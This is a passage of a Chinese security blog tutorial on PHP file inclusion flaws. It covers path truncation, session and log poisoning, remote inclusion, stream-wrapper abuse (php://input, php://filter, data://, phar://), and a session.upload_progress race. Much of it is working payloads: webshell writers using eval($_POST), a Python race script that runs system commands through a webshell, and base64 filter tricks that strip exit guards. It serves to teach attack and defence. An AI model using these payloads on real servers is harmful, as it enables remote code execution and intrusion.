x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a><strong>点号截断</strong></h5><p>条件：</p>
+<p>​        windows OS，点号需要长于256</p>
+<p>test代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:filename&#x3D;test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="session文件包含漏洞"><a href="#session文件包含漏洞" class="headerlink" title="session文件包含漏洞"></a>session文件包含漏洞</h4><p><a href="http://t0mrvvi1b3t.top/2021/04/29/%E5%85%B3%E4%BA%8Esession/">关于session</a></p>
+<p>利用条件：当session的存储位置可以获取</p>
+<ol>
+<li><p>通过phpinfo的信息可以获取到session的存储位置 如下👇</p>
+<p>​    通过phpinfo的信息，获取到session.save_path为/var/lib/php/session：</p>
+</li>
+</ol>
+<p><img src="https://img.vim-cn.com/e8/4552334a0f0ec9ca88052c5a60d233e6098e97.png" alt="p2"></p>
+<ol start="2">
+<li><p>通过猜测默认的session存放位置进行尝试  如下👇</p>
+<p>​    如linux下默认存储在/var/lib/php/session目录下</p>
+</li>
+</ol>
+<p>session中的内容可以被控制，传入恶意代码</p>
+<p>test代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]=<span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这段代码会将获取到的GET方式传入参数存入到session中</p>
+<p><strong>漏洞利用</strong></p>
+<p>通过上面的分析，可以知道传入参数会存储在session文件中，若存在本地文件包含漏洞，就可以a变量写入到session文件中，然后通过文件包含漏洞执行恶意代码。</p>
+<h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4><p>条件：</p>
+<ol>
+<li>allow_url_fopen = On（是否允许打开远程文件）</li>
+<li>allow_url_include = On（是否允许include/require远程文件）</li>
+</ol>
+<p>无限制远程文件包含漏洞</p>
+<p>test代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:filename&#x3D;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;phpinfo.txt</span><br><span class="line"></span><br><span class="line">phpinfo.txt:</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有限制远程文件包含漏洞</p>
+<p>test代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>] . <span class="string">&quot;.html&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过方式：</p>
+<ol>
+<li>问号绕过  payload：filename=<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx/phpinfo.txt">http://xxx.xxx.xxx.xxx/phpinfo.txt</a>?</li>
+<li>#号绕过  payload：filename=<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx/phpinfo.txt%23">http://xxx.xxx.xxx.xxx/phpinfo.txt%23</a></li>
+<li>空格绕过 payload：filename=<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx/phpinfo.txt%20">http://xxx.xxx.xxx.xxx/phpinfo.txt%20</a>  </li>
+</ol>
+<h4 id="关于php伪协议"><a href="#关于php伪协议" class="headerlink" title="关于php伪协议"></a>关于<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">php伪协议</a></h4><p><img src="https://ae01.alicdn.com/kf/Hab0f83469c9546fe89dc86301793dc07T.png" alt="image.png"></p>
+<h5 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h5><p>通过file协议可以访问本地文件系统，读取到文件的内容</p>
+<p>test:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:filename&#x3D;file:&#x2F;&#x2F;c:&#x2F;xxx.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="http"><a href="#http" class="headerlink" title="http://"></a>http://</h5><p>条件</p>
+<ol>
+<li>受allow_url_fopen限制</li>
+</ol>
+<p>格式：file=<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx/xxx.xxx">http://xxx.xxx.xxx.xxx/xxx.xxx</a></p>
+<h5 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h5><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。相关限制条件查看<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php">官方文档</a></p>
+<h6 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h6><p><strong>读取POST数据</strong></p>
+<p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
+<p>用法：?file=php://input 数据利用POST传过去。</p>
+<p>test：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//post.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接访问post.php  然后直接post上传数据即可</p>
+<p><strong>写入木马</strong></p>
+<p>条件：</p>
+<ol>
+<li>需同时开启 allow_url_fopen 和 allow_url_include</li>
+<li>PHP &lt; 5.3.0</li>
+</ol>
+<p>test：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//POST传入</span></span><br><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>命令执行</strong></p>
+<p>条件：</p>
+<ol>
+<li>需同时开启 allow_url_fopen 和 allow_url_include</li>
+<li>PHP &lt; 5.3.0</li>
+</ol>
+<p>可以造成任意代码执行，即POST过去PHP代码，即可执行。</p>
+<p>test同上</p>
+<p>直接post传php代码就可执行</p>
+<h6 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h6><p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。</p>
+<p>条件</p>
+<ol>
+<li>只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include</li>
+</ol>
+<p>用法：?filename=php://filter/convert.base64-encode/resource=xxx.php</p>
+<p>或是  ?filename=php://filter/read=convert.base64-encode/resource=xxx.php</p>
+<p>参数：👇</p>
+<p><img src="https://ae03.alicdn.com/kf/H852d11d3b87f4974a38554413358a4eah.png" alt="image.png"></p>
+<h5 id="data-（可以执行php代码）"><a href="#data-（可以执行php代码）" class="headerlink" title="data://（可以执行php代码）"></a>data://（可以执行php代码）</h5><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的</p>
+<p>例如：data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</p>
+<p>条件：</p>
+<ol>
+<li>PHP版本5.2，5.3，5.5，7.0；data:// 协议是是受限于allow_url_fopen的，官方文档上给出的是NO，所以要使用data://协议要满足双on条件</li>
+</ol>
+<p><strong>1、读取文件</strong></p>
+<p>和php伪协议的input类似，碰到file_get_contents()来用</p>
+<p>如果php.ini里的allow_url_include=On（PHP &lt; 5.3.0）,就可以造成任意代码执行，在这就可以理解成远程文件包含漏洞</p>
+<p>test：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOw&#x3D;&#x3D;								&#x2F;&#x2F;&lt;?php phpinfo();</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="zlib"><a href="#zlib" class="headerlink" title="zlib://"></a>zlib://</h5><ol>
+<li>zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用</li>
+<li>zlib:// ，bzip2:// ，zip:// — 压缩流，可以访问压缩文件中的子文件，而且不需要指定后缀名。配合文件上传来getshell</li>
+</ol>
+<h6 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h6><p>条件： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以</p>
+<p>使用：zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</p>
+<p>注意改后缀以及将#编码为%23</p>
+<h6 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2://"></a>bzip2://</h6><p>compress.bzip2://file.bz2</p>
+<p>在compress.bzip2://直接加压缩文件路径，相对绝对都可以</p>
+<h6 id="zlib-1"><a href="#zlib-1" class="headerlink" title="zlib://"></a>zlib://</h6><p>使用：compress.zlib://file.gz</p>
+<p>在compress.zlib://直接加压缩文件路径，相对绝对都可以</p>
+<h5 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h5><p>这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。</p>
+<p>用法：?file=phar://压缩包/内部文件 。</p>
+<p>注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。</p>
+<p>test：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="包含日志文件getshell"><a href="#包含日志文件getshell" class="headerlink" title="包含日志文件getshell"></a>包含日志文件getshell</h4><p>当没有上传点，并且也没有url_allow_include功能时，我们就可以考虑<strong>包含服务器的日志文件。</strong></p>
+<p>原理：当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中</p>
+<p>步骤：</p>
+<ol>
+<li>找到日志存放位置</li>
+<li>用bp或者curl来避免url转码</li>
+</ol>
+<p>相关细节见<a target="_blank" rel="noopener" href="https://www.cnblogs.com/my1e3/p/5854897.html">这里</a></p>
+<p>也可修改UA来写入一句话木马</p>
+<h4 id="利用session-upload-progress进行文件包含"><a href="#利用session-upload-progress进行文件包含" class="headerlink" title="利用session.upload_progress进行文件包含"></a>利用session.upload_progress进行文件包含</h4><p>这个功能在php5.4添加的需要注意一下版本.</p>
+<p>在php.ini有以下几个默认选项</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. session.upload_progress.enabled &#x3D; on</span><br><span class="line">2. session.upload_progress.cleanup &#x3D; on</span><br><span class="line">3. session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq &#x3D; &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq &#x3D; &quot;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这里，我们只需要了解前四个配置选项即可</p>
+<blockquote>
+<p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>
+<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>
+<p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>
+<p><code>prefix+name</code>将表示为session中的键名</p>
+</blockquote>
+<p>test环境：</p>
+<ul>
+<li>php5.5.38</li>
+<li>Windows10</li>
+<li>关于session的配置为默认值</li>
+</ul>
+<p>代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;<span class="subst">$b</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p>
+<p>可以看到代码里边并没有session_start() 那么怎么创建session文件呢？如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=T0mr，PHP将会在服务器上创建一个文件：/tmp/sess_T0mr。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
+<p>第二个问题  默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，那怎么才可以进行rce呢</p>
+<p>可以利用竞争，在session文件内容清空前进行包含利用。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;T0mr&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;url&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;xxx.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;url?file=session/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;xxx.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="php-filter绕过死亡代码"><a href="#php-filter绕过死亡代码" class="headerlink" title="php://filter绕过死亡代码"></a>php://filter绕过死亡代码</h4><p>代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了</p>
+<h5 id="1、base64"><a href="#1、base64" class="headerlink" title="1、base64"></a>1、base64</h5><p>这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。base64编码只包含了64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。所有就可以理解为，在php中对base64解码先匹配所有符合base64编码规范的字符在对其进行解码。所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了</p>
+<p>传入的<code>payload:txt==aPD9waHAgZXZhbCgkX1BPU1RbJ3gnXSk7Pz4=</code> <code>filename=php://filter/write=convet.base64-decode/resource=shell.php</code></p>
+<h5 id="2、strip-tags"><a href="#2、strip-tags" class="headerlink" title="2、strip_tags"></a>2、strip_tags</h5><p>除了使用base64特性的方法外，我们还可以利用php://filter字符串处理方法来去除“死亡exit”。</p>
+<p>这个<code>&lt;?php exit; ?&gt;</code>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p>
+<p><strong>strip_tags</strong></p>
+<ol>
+<li>(PHP 4, PHP 5, PHP 7, PHP 8)</li>
+<li>strip_tags — 从字符串中去除 HTML 和 PHP 标记</li>
+</ol>
+<p>php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原</p>
+<p><code>payload:txt=PD9waHAgZXZhbCgkX1BPU1RbJ3gnXSk7Pz4=</code> <code>filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</code></p>
+<h5 id="3、rot13"><a href="#3、rot13" class="headerlink" title="3、rot13"></a>3、rot13</h5><p>还可以利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了</p>
+<p><code>payload:txt=&lt;?cuc rkvg; ?&gt;</code> <code>filename=php://filter/write=string.rot13/resource=shell.php</code></p>
+<p>当然，这个方法的条件就是不开启短标签</p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/182280.html">https://www.freebuf.com/news/182280.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.y2hlbg.top/2021/04/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#post-comment">http://www.y2hlbg.top/2021/04/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#post-comment</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/my1e3/p/5854897.html">https://www.cnblogs.com/my1e3/p/5854897.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">T0mrvvi1b3t</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://t0mrvvi1b3t.top/2021/04/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">http://t0mrvvi1b3t.top/2021/04/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://t0mrvvi1b3t.top" target="_blank">T0mrvvi1b3t‘s blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></div><div class="post_share"><div class="social-share" data-image="https://img.vim-cn.com/a0/e44964f84a1e9df793e1bfb7f265d0fbe1454d.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/05/03/%E5%B7%A5%E5%85%B7/"><img class="prev-cover" 